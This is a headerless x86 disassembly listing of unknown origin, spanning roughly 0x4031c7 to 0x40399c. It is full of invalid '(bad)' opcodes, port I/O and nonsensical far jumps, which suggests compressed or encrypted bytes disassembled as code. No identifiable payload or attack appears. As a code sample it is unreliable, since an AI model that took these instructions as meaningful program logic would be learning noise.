  4031c7:	sbb    BYTE PTR [ecx+0x3c],dh
  4031ca:	jmp    0x403214
  4031cc:	dec    ebp
  4031cd:	ret    0x1f3e
  4031d0:	bound  esp,QWORD PTR [edx+eiz*4+0x2460c6f2]
  4031d7:	scas   eax,DWORD PTR es:[edi]
  4031d8:	mov    ah,0x66
  4031da:	in     eax,0x1d
  4031dc:	repnz jmp 0x6671:0x7abb5fb4
  4031e4:	xchg   DWORD PTR [eax+0xdfe7f53],esi
  4031ea:	adc    al,0xe7
  4031ec:	loopne 0x403178
  4031ee:	lock or eax,DWORD PTR [edi-0x5a]
  4031f2:	(bad)  
  4031f3:	aas    
  4031f4:	test   eax,0xbf4b437d
  4031f9:	in     al,0xcc
  4031fb:	ret    
  4031fc:	std    
  4031fd:	dec    esp
  4031fe:	inc    eax
  4031ff:	xor    esi,DWORD PTR [edx+0x17]
  403202:	rol    ebp,1
  403204:	fisubr WORD PTR [esi]
  403206:	jo     0x4031b9
  403208:	push   esp
  403209:	(bad)  
  40320a:	push   eax
  40320b:	lods   al,BYTE PTR ds:[esi]
  40320c:	push   0xccaf417f
  403211:	jno    0x4031e8
  403213:	fimul  WORD PTR [ebx-0xa]
  403216:	dec    ebp
  403217:	les    ecx,FWORD PTR [esi-0x7319035c]
  40321d:	push   es
  40321e:	xchg   ebp,eax
  40321f:	mov    ebp,DWORD PTR [esi]
  403221:	mov    ch,0x29
  403223:	daa    
  403224:	pusha  
  403225:	mov    ebx,0xfaa1f8dd
  40322a:	and    al,0xf5
  40322c:	jl     0x403282
  40322e:	xor    ch,BYTE PTR fs:[ebx+0x6e]
  403232:	out    0xb9,al
  403234:	shl    esi,0xa0
  403237:	pop    ebp
  403238:	in     eax,dx
  403239:	fidivr DWORD PTR [edx]
  40323b:	add    ebp,esi
  40323d:	mov    ecx,0x6695e4eb
  403242:	push   cs
  403243:	ins    BYTE PTR es:[edi],dx
  403244:	call   0x8586:0xae0fca68
  40324b:	inc    DWORD PTR [esi+0x72583b3b]
  403251:	and    DWORD PTR [eax-0x31],esi
  403254:	or     dl,bh
  403256:	out    dx,al
  403257:	sub    DWORD PTR [edi+edi*4+0x1b],esi
  40325b:	pop    ds
  40325c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325d:	lods   eax,DWORD PTR ds:[esi]
  40325e:	or     edi,ebx
  403260:	mov    eax,0x3f725abd
  403265:	cmp    BYTE PTR [ecx+0x7c],bl
  403268:	sbb    dl,dl
  40326a:	cmp    edi,0x32
  40326d:	adc    eax,0x4a12364e
  403272:	(bad)  
  403273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403274:	mov    al,0x51
  403276:	clc    
  403277:	imul   ecx,DWORD PTR [ebx+0x8],0xffffffa7
  40327b:	cdq    
  40327c:	(bad)  
  40327d:	mov    DWORD PTR [edx],0xfb8917bb
  403283:	nop
  403284:	inc    edi
  403285:	je     0x403223
  403287:	xchg   esp,eax
  403288:	mov    ebp,0xdf3bfba4
  40328d:	out    0x43,al
  40328f:	sub    al,0x38
  403291:	xchg   esp,eax
  403292:	push   0x7124d37
  403297:	mov    eax,ds:0xdb3e03
  40329c:	lahf   
  40329d:	or     eax,0x47d709f
  4032a2:	xchg   ebx,eax
  4032a3:	push   edx
  4032a4:	jmp    0x4032b8
  4032a6:	mov    dl,bl
  4032a8:	fisttp WORD PTR ds:0x918215fa
  4032ae:	imul   edx,DWORD PTR [ebp-0x5c78a741],0x7fa43fcd
  4032b8:	dec    ebp
  4032b9:	mov    DWORD PTR [ecx+0xf],0xa6a193d1
  4032c0:	lods   al,BYTE PTR ds:[esi]
  4032c1:	out    0xe8,eax
  4032c3:	out    0x1c,al
  4032c5:	pop    ss
  4032c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032c7:	jne    0x4032c6
  4032c9:	stc    
  4032ca:	cmp    eax,0x6fac4384
  4032cf:	(bad)  
  4032d0:	adc    eax,0x6ffe06dd
  4032d5:	mov    ebp,ebx
  4032d7:	sbb    BYTE PTR [ebp+0x73],dh
  4032da:	pop    ds
  4032db:	(bad)  
  4032dc:	fmul   DWORD PTR [edi]
  4032de:	in     al,dx
  4032df:	into   
  4032e0:	add    al,0xe7
  4032e2:	enter  0x228,0xc2
  4032e6:	ret    0x6ea7
  4032e9:	lods   eax,DWORD PTR ds:[esi]
  4032ea:	cdq    
  4032eb:	mov    eax,0x1880e54e
  4032f0:	jmp    0x3a346663
  4032f5:	push   ss
  4032f6:	xor    DWORD PTR [edi+0x77],edi
  4032f9:	add    DWORD PTR [edi+0x42931124],esp
  4032ff:	mov    esp,0x6c8babbb
  403304:	xchg   esp,eax
  403305:	add    eax,0x9a35c5d9
  40330a:	dec    ebx
  40330b:	out    dx,eax
  40330c:	prefetch BYTE PTR [esi-0x1f]
  403310:	mov    ch,0x4c
  403312:	cmp    eax,0x789095e5
  403317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403318:	in     al,0x2b
  40331a:	pushf  
  40331b:	inc    ebp
  40331c:	int3   
  40331d:	push   ebp
  40331e:	and    BYTE PTR [ecx],cl
  403320:	pushf  
  403321:	adc    eax,0x76671381
  403326:	pushf  
  403327:	mov    WORD PTR [ebp-0x4ff37866],cs
  40332d:	or     eax,0xd426889c
  403332:	sbb    edx,ebx
  403334:	neg    DWORD PTR [edi-0x6b]
  403337:	retf   0xf61b
  40333a:	mov    ds:0x73ded84b,al
  40333f:	ins    BYTE PTR es:[edi],dx
  403340:	imul   ebp,DWORD PTR [edi+0x61a4588b],0xa0703da9
  40334a:	cmp    DWORD PTR [esi-0x4e29f6e9],ebx
  403350:	loopne 0x4033b2
  403352:	(bad)  
  403353:	(bad)  
  403355:	cmp    dh,BYTE PTR [ebp-0x57]
  403358:	dec    ebp
  403359:	loopne 0x40334a
  40335b:	adc    ah,BYTE PTR [edx-0x56]
  40335e:	cmp    ch,BYTE PTR [ecx-0xa]
  403361:	mov    al,ds:0x53fe1464
  403366:	pusha  
  403367:	jae    0x403344
  403369:	arpl   di,sp
  40336b:	ja     0x4033ba
  40336d:	pusha  
  40336e:	jnp    0x40338e
  403370:	cmp    eax,0x34d05f0c
  403375:	dec    esi
  403376:	into   
  403377:	nop
  403378:	jmp    0x403342
  40337a:	dec    edx
  40337b:	lahf   
  40337c:	and    esp,0x5f
  40337f:	xchg   esi,eax
  403380:	sahf   
  403381:	iret   
  403382:	jbe    0x40332e
  403384:	push   ds
  403385:	fst    DWORD PTR [eax]
  403387:	mov    cl,0x4a
  403389:	dec    ebp
  40338a:	push   ss
  40338b:	cmp    al,0x67
  40338d:	ss hlt 
  40338f:	xlat   BYTE PTR ds:[ebx]
  403390:	mov    eax,ds:0x3d854940
  403395:	or     BYTE PTR [ebp+0x12],ah
  403398:	push   ss
  403399:	test   eax,0x406999cd
  40339e:	or     eax,0x19658f69
  4033a3:	out    0xc4,al
  4033a5:	(bad)  
  4033a6:	enter  0x9ab7,0x77
  4033aa:	add    eax,0xe872564b
  4033af:	adc    al,0xba
  4033b1:	xlat   BYTE PTR ds:[ebx]
  4033b2:	adc    eax,0xfde36891
  4033b7:	dec    edx
  4033b8:	imul   edi,ecx,0xffffffe9
  4033bb:	daa    
  4033bc:	into   
  4033bd:	jge    0x403425
  4033bf:	push   0xffffffae
  4033c1:	in     al,dx
  4033c2:	retf   0x4c36
  4033c5:	cld    
  4033c6:	loopne 0x4033ab
  4033c8:	mov    bl,0x33
  4033ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033cb:	mov    fs,WORD PTR [edx-0x53]
  4033ce:	(bad)  
  4033cf:	icebp  
  4033d0:	pop    es
  4033d1:	das    
  4033d2:	aad    0x11
  4033d4:	into   
  4033d5:	adc    al,0xec
  4033d7:	push   eax
  4033d8:	scas   al,BYTE PTR es:[edi]
  4033d9:	addr16 mov eax,0x240d213d
  4033df:	fcomp  st(2)
  4033e1:	adc    eax,edi
  4033e3:	lahf   
  4033e4:	dec    eax
  4033e5:	inc    eax
  4033e6:	ror    DWORD PTR [ebx+0x7e7d9014],0xe9
  4033ed:	pop    eax
  4033ee:	push   ds
  4033ef:	mov    al,BYTE PTR [eax]
  4033f1:	jle    0x403410
  4033f3:	dec    edx
  4033f4:	sti    
  4033f5:	pop    ds
  4033f6:	mov    ax,ds:0x2c29fa67
  4033fc:	lahf   
  4033fd:	jmp    0x40344d
  4033ff:	enter  0xebd1,0x44
  403403:	xlat   BYTE PTR ds:[ebx]
  403404:	out    dx,al
  403405:	es push edx
  403407:	jp     0x4033be
  403409:	lods   al,BYTE PTR ds:[esi]
  40340a:	pushf  
  40340b:	pop    es
  40340c:	iret   
  40340d:	xor    eax,0x2c072be5
  403412:	in     eax,0xd1
  403414:	imul   ebx,DWORD PTR [ecx+eax*8],0x1a
  403418:	es dec ebp
  40341a:	and    bh,0xa2
  40341d:	jecxz  0x403442
  40341f:	xlat   BYTE PTR ds:[ebx]
  403420:	dec    esp
  403421:	into   
  403422:	xor    edx,DWORD PTR [edx-0x7e4aa86]
  403428:	cmp    al,bh
  40342a:	gs or  dl,cl
  40342d:	add    bl,bl
  40342f:	dec    ebp
  403430:	test   al,0xbc
  403432:	fdiv   QWORD PTR [eax]
  403434:	push   ds
  403435:	test   eax,0x3df5205c
  40343a:	jb     0x40347f
  40343c:	sbb    BYTE PTR [ebx-0x5b001476],bh
  403442:	adc    cl,BYTE PTR [esi]
  403444:	pop    edi
  403445:	jae    0x40347b
  403447:	ss pop ebp
  403449:	cdq    
  40344a:	adc    ebp,DWORD PTR [edx]
  40344c:	fisttp WORD PTR [esi+0x6c164d82]
  403452:	jnp    0x403472
  403454:	(bad)  
  403455:	jmp    0x5b807012
  40345a:	js     0x4033df
  40345c:	adc    eax,0xffb487ad
  403461:	shl    DWORD PTR [eax+0x12df87bb],0xfe
  403468:	xchg   ecx,eax
  403469:	stos   BYTE PTR es:[edi],al
  40346a:	xor    bl,BYTE PTR [esi+0x60]
  40346d:	cdq    
  40346e:	fisub  WORD PTR [ecx+0x38]
  403471:	xchg   DWORD PTR [edi+0x57f38d0f],edi
  403477:	ret    
  403478:	bound  edi,QWORD PTR [ebx-0x792a6a83]
  40347e:	mov    al,ds:0x4e52b20f
  403483:	mov    ds:0x248ce0b5,al
  403488:	ret    0x2c9e
  40348b:	push   ebx
  40348c:	popa   
  40348d:	fisttp QWORD PTR ss:[edx-0x67]
  403491:	imul   esi,DWORD PTR [edx],0x1f
  403494:	sbb    BYTE PTR [esi],bl
  403496:	pop    ds
  403497:	gs popf 
  403499:	(bad)  
  40349a:	out    dx,eax
  40349b:	test   al,0x5c
  40349d:	bound  eax,QWORD PTR [ecx+eiz*8]
  4034a0:	lea    esi,[eax-0x32]
  4034a3:	jl     0x4034a1
  4034a5:	push   eax
  4034a6:	pop    ebx
  4034a7:	popa   
  4034a8:	in     eax,0x33
  4034aa:	adc    DWORD PTR [ebp+0x50],edi
  4034ad:	(bad)  
  4034ae:	arpl   WORD PTR [edi-0x463fe16c],di
  4034b4:	aam    0x30
  4034b6:	jmp    0x403463
  4034b8:	imul   esp,DWORD PTR [edi+0x79f94d72],0xe7a51e3e
  4034c2:	pop    ebx
  4034c3:	cmp    BYTE PTR [edx+0x58],ah
  4034c6:	jae    0x403530
  4034c8:	sbb    al,0xe8
  4034ca:	test   BYTE PTR [eax+0x78],bl
  4034cd:	push   ds
  4034ce:	push   ebp
  4034cf:	out    0xcc,eax
  4034d1:	add    ebp,ebp
  4034d3:	pushw  es
  4034d5:	push   ebx
  4034d6:	and    eax,0x5ff4557b
  4034db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034dc:	imul   esp,DWORD PTR [edi+0x1e],0xffffffac
  4034e0:	push   sp
  4034e2:	inc    esi
  4034e3:	pop    es
  4034e4:	stos   DWORD PTR es:[edi],eax
  4034e5:	inc    eax
  4034e6:	scas   eax,DWORD PTR es:[edi]
  4034e7:	test   al,0xfd
  4034e9:	mov    ds:0x8a2e0e6b,al
  4034ee:	repnz addr16 inc ecx
  4034f1:	xor    eax,edi
  4034f3:	imul   edi,edi,0x42
  4034f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034f7:	xchg   edi,eax
  4034f8:	bound  ecx,QWORD PTR [edi]
  4034fa:	sbb    ah,BYTE PTR [ebx+eax*4-0x1e]
  4034fe:	and    eax,0x65dc8af2
  403503:	xchg   BYTE PTR [esi],dh
  403505:	bound  ebx,QWORD PTR [ebx+0x3f25063a]
  40350b:	imul   edx,edi,0xe6e96eaa
  403511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403512:	xchg   ebx,eax
  403513:	xor    al,0x52
  403515:	ds leave 
  403517:	and    ebx,ebx
  403519:	idiv   BYTE PTR [ecx]
  40351b:	mov    dh,0xc7
  40351d:	repnz add al,0x87
  403520:	lahf   
  403521:	xor    ecx,esi
  403523:	out    0x32,eax
  403525:	in     al,dx
  403526:	mov    ds:0xa01d811e,eax
  40352b:	lock xchg DWORD PTR [esi+edx*4-0x724e6bbc],edx
  403533:	xchg   ebp,eax
  403534:	ss or  ebx,edx
  403537:	jecxz  0x4034bc
  403539:	std    
  40353a:	scas   al,BYTE PTR es:[edi]
  40353b:	nop
  40353c:	jecxz  0x40356d
  40353e:	add    DWORD PTR [ecx-0x1d5514ac],eax
  403544:	in     eax,0x22
  403546:	(bad)  
  403547:	pop    edx
  403548:	dec    ebp
  403549:	arpl   WORD PTR [eax],di
  40354b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40354c:	jle    0x40356b
  40354e:	sub    al,0xf4
  403550:	push   edx
  403551:	dec    esp
  403552:	adc    eax,0x14f92a7b
  403557:	ss add dh,ch
  40355a:	pop    ecx
  40355b:	inc    edi
  40355c:	dec    ecx
  40355d:	xlat   BYTE PTR ds:[ebx]
  40355e:	pushf  
  40355f:	lea    esp,[edi+esi*1+0x37]
  403563:	and    ecx,esi
  403565:	jnp    0x40355c
  403567:	push   ss
  403568:	and    DWORD PTR [edx-0x4f],eax
  40356b:	stc    
  40356c:	daa    
  40356d:	rcl    DWORD PTR [edx+esi*1],1
  403570:	ret    0xd2be
  403573:	pop    es
  403574:	xchg   ebx,eax
  403575:	xchg   ebx,eax
  403576:	xchg   esp,eax
  403577:	adc    al,BYTE PTR [edx-0x3a]
  40357a:	sbb    al,0xa6
  40357c:	push   ecx
  40357d:	cmp    cl,BYTE PTR [ebp+0x12]
  403580:	jl     0x403575
  403582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403583:	pop    esi
  403584:	loope  0x4035d5
  403586:	jecxz  0x403607
  403588:	sub    bh,BYTE PTR [ebp-0x50]
  40358b:	into   
  40358c:	scas   al,BYTE PTR es:[edi]
  40358d:	cmp    al,0x45
  40358f:	push   ds
  403590:	adc    al,0x8b
  403592:	sub    eax,0x8bd3adc6
  403597:	adc    al,dl
  403599:	mov    al,0x68
  40359b:	lods   al,BYTE PTR ds:[esi]
  40359c:	aas    
  40359d:	in     eax,dx
  40359e:	mul    BYTE PTR [ecx+0x41c0eab6]
  4035a4:	add    eax,0x3ed7c4f2
  4035a9:	mov    esi,0xbd2ee09f
  4035ae:	pusha  
  4035af:	dec    ebp
  4035b0:	jmp    0x40359f
  4035b2:	jb     0x4035fd
  4035b4:	pop    eax
  4035b5:	pop    ds
  4035b6:	push   eax
  4035b7:	test   DWORD PTR [edx],0x79df3574
  4035bd:	xor    ebx,edx
  4035bf:	arpl   WORD PTR [edi-0x2361c0e1],dx
  4035c5:	aaa    
  4035c6:	dec    ebp
  4035c7:	inc    ebx
  4035c8:	jge    0x4035a1
  4035ca:	dec    esp
  4035cb:	push   edx
  4035cc:	inc    esi
  4035cd:	outs   dx,DWORD PTR ds:[esi]
  4035ce:	adc    ebp,ebp
  4035d0:	pop    esp
  4035d1:	sub    esi,edi
  4035d3:	setb   BYTE PTR [ebx]
  4035d6:	pop    ebp
  4035d7:	jmp    DWORD PTR [ebp-0x2b]
  4035da:	xor    cl,dh
  4035dc:	sub    eax,DWORD PTR [ecx-0x1c19e910]
  4035e2:	mov    bh,0x99
  4035e4:	jae    0x4035c9
  4035e6:	sub    al,0x72
  4035e8:	pop    ss
  4035e9:	loope  0x40356b
  4035eb:	call   0x999e:0x6e420e2a
  4035f2:	or     BYTE PTR [edi+0x76],ah
  4035f5:	inc    ebp
  4035f6:	inc    eax
  4035f7:	call   0x43181cb0
  4035fc:	jo     0x4035fc
  4035fe:	pop    ds
  4035ff:	jle    0x403583
  403601:	stos   BYTE PTR es:[edi],al
  403602:	inc    edi
  403603:	push   ds
  403604:	imul   esp,DWORD PTR [esi-0x34f9c831],0x3d
  40360b:	popa   
  40360c:	cli    
  40360d:	cmp    cl,ch
  40360f:	xchg   edx,eax
  403610:	mov    ds:0xe52fa588,al
  403615:	cwde   
  403616:	dec    edi
  403617:	loope  0x4035ff
  403619:	fadd   QWORD PTR [esi]
  40361b:	gs (bad) 
  40361d:	jle    0x403680
  40361f:	(bad)  
  403620:	in     eax,dx
  403621:	jno    0x40360c
  403623:	dec    eax
  403624:	mov    eax,DWORD PTR [ecx+0x22]
  403627:	or     DWORD PTR [bp+si],0x5436ed92
  40362e:	not    ch
  403630:	mov    cl,0x8d
  403632:	xor    ah,BYTE PTR [esi]
  403634:	call   0xaaf7dc75
  403639:	xrelease xchg BYTE PTR [edi+0x4167b728],cl
  403640:	mov    WORD PTR [esi],gs
  403642:	mov    ecx,0x69476323
  403647:	sub    cl,BYTE PTR [eax-0x669bbbc7]
  40364d:	adc    bh,BYTE PTR [edx]
  40364f:	pusha  
  403650:	mov    BYTE PTR [eax+0x5b],ah
  403653:	int    0xa4
  403655:	(bad)  
  403656:	dec    edi
  403657:	fs xor eax,0xa9114420
  40365d:	sbb    bl,dl
  40365f:	rol    ecx,cl
  403661:	sbb    al,0xac
  403663:	jmp    0x4036d4
  403665:	mov    ecx,0x527b60de
  40366a:	pop    edi
  40366b:	mov    edi,DWORD PTR [esi-0x16]
  40366e:	lods   al,BYTE PTR ds:[esi]
  40366f:	stc    
  403670:	mov    ch,0xb8
  403672:	lock rcl BYTE PTR [ebp-0x55],1
  403676:	ror    DWORD PTR [ebp+ebp*2-0x736143],0xd1
  40367e:	(bad)  
  40367f:	outs   dx,DWORD PTR ds:[esi]
  403680:	mov    eax,ds:0xda6baf0e
  403685:	cmc    
  403686:	pusha  
  403687:	(bad)  
  403688:	jne    0x40366c
  40368a:	add    eax,0xd7485647
  40368f:	jg     0x4036ce
  403691:	or     eax,0xf48a23d8
  403696:	shl    DWORD PTR [edi-0x59],cl
  403699:	into   
  40369a:	dec    edi
  40369b:	dec    esi
  40369c:	fidivr WORD PTR [ecx]
  40369e:	jo     0x4036b6
  4036a0:	xor    ah,bh
  4036a2:	imul   esp,DWORD PTR [ebp-0x8],0xba46e315
  4036a9:	cld    
  4036aa:	and    cl,BYTE PTR gs:[ebp+0x4c00a499]
  4036b1:	sub    cl,BYTE PTR [esi-0xaa87821]
  4036b7:	fsub   st,st(0)
  4036b9:	adc    al,BYTE PTR [edi-0x4c]
  4036bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036bd:	cmp    esi,DWORD PTR [edi+ebp*8]
  4036c0:	xor    BYTE PTR [ebx+ebx*4-0x7b],ah
  4036c4:	in     eax,dx
  4036c5:	mov    al,0x50
  4036c7:	and    cl,bl
  4036c9:	cmp    edx,esp
  4036cb:	aas    
  4036cc:	ds push ebp
  4036ce:	xor    al,0x61
  4036d0:	in     eax,dx
  4036d1:	cmp    bl,BYTE PTR [ebx]
  4036d3:	(bad)  
  4036d4:	pop    ebx
  4036d5:	cdq    
  4036d6:	jno    0x403729
  4036d8:	pushf  
  4036d9:	cmovae ebx,DWORD PTR [esi+0xd3bdf10]
  4036e0:	xchg   esi,eax
  4036e1:	fst    QWORD PTR [edx-0x482fbbb7]
  4036e7:	pusha  
  4036e8:	bound  eax,QWORD PTR [esi-0x39]
  4036eb:	cmp    al,0x35
  4036ed:	jo     0x4036e0
  4036ef:	mov    DWORD PTR [edi],esi
  4036f1:	dec    esp
  4036f2:	js     0x4036ff
  4036f4:	jl     0x403746
  4036f6:	das    
  4036f7:	pop    eax
  4036f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f9:	or     al,0x5d
  4036fb:	call   0xd481be88
  403700:	cmp    eax,0x837f2b85
  403705:	addr16 xchg ebx,eax
  403707:	sub    eax,eax
  403709:	xor    edi,ebx
  40370b:	mov    edi,DWORD PTR [esi]
  40370d:	ja     0x40372c
  40370f:	mov    esp,0x4071ec8d
  403714:	inc    edi
  403715:	add    esp,0xffffffe0
  403718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403719:	push   ecx
  40371a:	dec    esi
  40371b:	out    dx,eax
  40371c:	fisub  DWORD PTR [ebx+0x55748083]
  403722:	retf   0xc4a7
  403725:	mov    ebx,0x4b62253
  40372a:	mov    edi,0x70de647c
  40372f:	jp     0x40371b
  403731:	xchg   DWORD PTR [edx],edi
  403733:	sar    BYTE PTR [eax],0x15
  403736:	loope  0x4036e7
  403738:	cld    
  403739:	je     0x40376f
  40373b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373c:	into   
  40373d:	cmp    ebp,DWORD PTR [eax+ecx*2-0x72]
  403741:	pop    ebp
  403742:	test   al,0xeb
  403744:	sub    DWORD PTR [eax],0xcad4dd82
  40374a:	xor    ah,ah
  40374c:	mov    ebx,fs
  40374e:	xor    ebx,ebp
  403750:	das    
  403751:	jg     0x403744
  403753:	xchg   edx,eax
  403754:	sbb    al,0xd7
  403756:	gs dec edx
  403758:	ret    
  403759:	pop    ebp
  40375a:	push   es
  40375b:	pop    ebp
  40375c:	fistp  WORD PTR [eax+0x7b]
  40375f:	in     eax,0x95
  403761:	and    bl,BYTE PTR [esi-0x5d8bc373]
  403767:	inc    edi
  403768:	or     eax,DWORD PTR [ebp+0x6220e593]
  40376e:	mov    ebp,0x46868ca
  403773:	xchg   edx,eax
  403774:	add    DWORD PTR [edx-0x49],edx
  403777:	inc    ecx
  403778:	imul   eax,ecx,0xe
  40377b:	enter  0x2260,0xba
  40377f:	dec    esp
  403780:	(bad)
  403784:	int3   
  403785:	jb     0x4037e2
  403787:	je     0x403740
  403789:	(bad)  
  40378a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40378b:	sti    
  40378c:	fadd   st(3),st
  40378e:	cmp    eax,0x367a6102
  403793:	jne    0x403738
  403795:	push   esi
  403796:	dec    edi
  403797:	sub    BYTE PTR [ebx],ch
  403799:	cmp    BYTE PTR [eax+0x1f],al
  40379c:	retf   0x734a
  40379f:	push   es
  4037a0:	adc    eax,0x44dc556b
  4037a5:	sbb    al,0x6c
  4037a7:	adc    BYTE PTR [ecx-0x1e],0xef
  4037ab:	mov    esp,ebp
  4037ad:	in     eax,dx
  4037ae:	sar    BYTE PTR [esp+eiz*8-0x14],1
  4037b2:	pop    esp
  4037b3:	test   BYTE PTR [edx+0x3f],dh
  4037b6:	mov    al,ds:0xa5b0b7f0
  4037bb:	mov    dl,0xec
  4037bd:	fmul   st,st(5)
  4037bf:	inc    ebx
  4037c0:	mov    DWORD PTR [edi-0x6008bd8e],ebp
  4037c6:	test   BYTE PTR [eax],dl
  4037c8:	sbb    DWORD PTR [ebx-0x6],edx
  4037cb:	mov    ss,WORD PTR [edi+0xc5f016b]
  4037d1:	mov    edx,0x88646a57
  4037d6:	repnz mov dl,0xdc
  4037d9:	sbb    bh,BYTE PTR [edi+0x626744b6]
  4037df:	stos   BYTE PTR es:[edi],al
  4037e0:	or     eax,0xe4fc98ab
  4037e5:	repnz dec esi
  4037e7:	inc    edi
  4037e8:	push   ecx
  4037e9:	scas   al,BYTE PTR es:[edi]
  4037ea:	aas    
  4037eb:	cmp    ah,BYTE PTR [edx]
  4037ed:	add    DWORD PTR [edx-0x17],0xddb96f02
  4037f4:	repnz xchg ebp,eax
  4037f6:	sbb    edi,DWORD PTR [eax+0x3]
  4037f9:	fucom  st(0)
  4037fb:	in     eax,dx
  4037fc:	dec    ebx
  4037fd:	stos   BYTE PTR es:[edi],al
  4037fe:	mov    eax,0xb1056681
  403803:	jle    0x4037cc
  403805:	or     dl,cl
  403807:	cmc    
  403808:	xor    BYTE PTR [edi],dl
  40380a:	xor    eax,0xf5c1692c
  40380f:	or     bh,BYTE PTR ds:0x59db81b
  403815:	and    BYTE PTR [edi+0x2abf3e23],ah
  40381b:	out    0x73,eax
  40381d:	push   ecx
  40381e:	ja     0x4037ad
  403820:	pop    esp
  403821:	add    BYTE PTR [ebx+0x662e54dc],dh
  403827:	add    edi,DWORD PTR [ebx+0x67]
  40382a:	push   esi
  40382b:	ds pop ds
  40382d:	(bad)  
  40382e:	out    0xc3,al
  403830:	or     eax,DWORD PTR [eax+eiz*2-0x5763fb51]
  403837:	mov    edi,0xdbf2b36c
  40383c:	ja     0x40380f
  40383e:	xchg   edx,eax
  40383f:	out    0x9a,eax
  403841:	xchg   esp,eax
  403842:	leave  
  403843:	fistp  DWORD PTR [ebp+0x4419db07]
  403849:	lock jae 0x403875
  40384c:	sbb    eax,esp
  40384e:	cdq    
  40384f:	jge    0x40385c
  403851:	mov    cl,0x20
  403853:	(bad)  
  403854:	(bad)  
  403855:	call   0x1d208551
  40385a:	add    DWORD PTR [ebp+0x71de808e],0xffffffe4
  403861:	jecxz  0x403875
  403863:	(bad)  
  403864:	pop    edi
  403865:	das    
  403866:	ds pop eax
  403868:	fstp   DWORD PTR [edi+ebp*1-0x31]
  40386c:	call   0x57e9:0x932431a8
  403873:	mov    cl,BYTE PTR [esi-0x6e]
  403876:	outs   dx,BYTE PTR ds:[esi]
  403877:	shr    BYTE PTR [eax-0x37],1
  40387a:	mov    ecx,0x52194c45
  40387f:	(bad)  
  403880:	scas   al,BYTE PTR es:[edi]
  403881:	jmp    0xfef77d37
  403886:	into   
  403887:	hlt    
  403888:	or     eax,0x57112d77
  40388d:	push   cs
  40388e:	out    dx,al
  40388f:	mov    edx,0x570f08c
  403894:	mov    ebx,0x1f400d58
  403899:	fstp   QWORD PTR [edx-0x658343be]
  40389f:	pop    edi
  4038a0:	push   esp
  4038a1:	jno    0x40382e
  4038a3:	adc    ebp,ecx
  4038a5:	pop    DWORD PTR [edi-0x7569d01f]
  4038ab:	shr    bh,cl
  4038ad:	sbb    BYTE PTR [ebx-0x6809d877],bl
  4038b3:	pop    ebx
  4038b4:	lock pop ss
  4038b6:	dec    edi
  4038b7:	push   eax
  4038b8:	or     al,0x4d
  4038ba:	jbe    0x4038d5
  4038bc:	mov    esp,0xa5bfaf67
  4038c1:	mov    al,ds:0xa3ab4fa3
  4038c6:	ins    BYTE PTR es:[edi],dx
  4038c7:	cmp    DWORD PTR [edx],ebx
  4038c9:	cmp    DWORD PTR [edi],ebx
  4038cb:	pop    ss
  4038cc:	sbb    al,0xe7
  4038ce:	or     DWORD PTR [ebx-0x53156562],edx
  4038d4:	jb     0x403870
  4038d6:	mov    cl,0x40
  4038d8:	mov    ebp,0x291dcf7c
  4038dd:	sahf   
  4038de:	sub    DWORD PTR [eax],edi
  4038e0:	adc    ch,BYTE PTR [ecx-0x2d]
  4038e3:	(bad)  
  4038e4:	pusha  
  4038e5:	dec    esi
  4038e6:	xchg   DWORD PTR [edi+0x31310bad],ebp
  4038ec:	test   BYTE PTR [eax],0x37
  4038ef:	push   edx
  4038f0:	das    
  4038f1:	pop    eax
  4038f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038f3:	jle    0x403927
  4038f5:	(bad)  
  4038f6:	fs add eax,0x3af78bbe
  4038fc:	cmp    dl,0xd7
  4038ff:	and    DWORD PTR [eax-0x58],ecx
  403902:	add    BYTE PTR [edi],dh
  403904:	rcr    BYTE PTR [ebp+0x13bf6ade],0x4
  40390b:	adc    BYTE PTR [edx+0x5f9d7a1e],cl
  403911:	add    BYTE PTR [edx+0x3ff533d1],al
  403917:	mov    bh,0xb9
  403919:	and    DWORD PTR [edx],edi
  40391b:	in     al,0xf7
  40391d:	or     eax,0xca82bf17
  403922:	mov    ebx,0xb10148f3
  403927:	dec    edx
  403928:	mov    esi,0xea40f378
  40392d:	in     al,dx
  40392e:	sbb    DWORD PTR [ecx-0x4c],esp
  403931:	lahf   
  403932:	mov    bl,0xf6
  403934:	mov    edi,0x7fc1998e
  403939:	shl    edi,1
  40393b:	xor    DWORD PTR [eax+edx*1-0x54f36c1f],0xacee819b
  403946:	inc    esi
  403947:	sub    esp,DWORD PTR es:[ebp+0x19c6d58d]
  40394e:	sbb    ebp,esi
  403950:	cmp    eax,0x37262af9
  403955:	ds cmp ebx,eax
  403958:	or     al,0x49
  40395a:	leave  
  40395b:	pop    esi
  40395c:	std    
  40395d:	xchg   edi,eax
  40395e:	and    dl,dh
  403960:	pushf  
  403961:	daa    
  403962:	xchg   ebx,eax
  403963:	xor    ah,BYTE PTR [ebx-0x449beeb]
  403969:	retf   0xf1d9
  40396c:	add    DWORD PTR [edx+0x1],edi
  40396f:	sub    eax,0x5d5bb666
  403974:	cli    
  403975:	sbb    al,0x46
  403977:	mov    edi,0x2d5f3249
  40397c:	hlt    
  40397d:	in     eax,dx
  40397e:	add    BYTE PTR [esi],al
  403980:	stc    
  403981:	inc    esp
  403982:	sbb    DWORD PTR [esi-0x67b50b80],0x630916fd
  40398c:	cli    
  40398d:	adc    edx,esp
  40398f:	cmp    eax,0x6dc8afa4
  403994:	mov    eax,DWORD PTR [esi+0x69477d2c]
  40399a:	int3   
  40399b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40399c:	adc    al,0x58
